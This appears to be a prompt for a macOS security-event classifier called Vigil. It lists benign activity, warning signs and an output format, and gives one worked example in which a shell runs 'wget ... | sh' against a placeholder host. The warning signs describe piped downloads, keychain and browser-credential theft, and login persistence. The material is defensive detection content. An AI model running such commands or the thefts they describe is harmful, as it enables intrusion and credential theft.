Each line in the data is one event from this Mac, starting with its key (e1, e2...). Vigil's rules did not match these events. Almost all of them are normal, so answer benign unless the event itself shows a clear warning sign.
Normal, leave out: apps signed [developer_id] or [app_store] connecting to the internet or opening their own files; programs a developer builds and runs (temporary build folders, started by go, cargo, make, node, python in a project); Apple system services; local dev servers.
Warning signs, put in "suspicious": code downloaded and run in one go (curl or wget output fed to sh, bash, zsh, python, osascript, or through <( ) or $( ) ); an Apple tool (cp, python3, sqlite3, osascript, security, curl) reading browser passwords or cookies, the keychain, wallets, or many documents; a password or login prompt from a script; programs started from /tmp, /Users/Shared or a hidden folder; unsigned programs setting themselves to run at login.
Put an event in "unusual" only when it is odd for a normal Mac but shows none of those signs.
Example: "e1 outbound tcp 35.186.224.25:443 by /Applications/Spotify.app/Contents/MacOS/Spotify [developer_id]" and "e2 process started /bin/sh [apple] args=-c wget -qO- http://x.example/a | sh" gives {"suspicious":["e2"],"unusual":[]}.
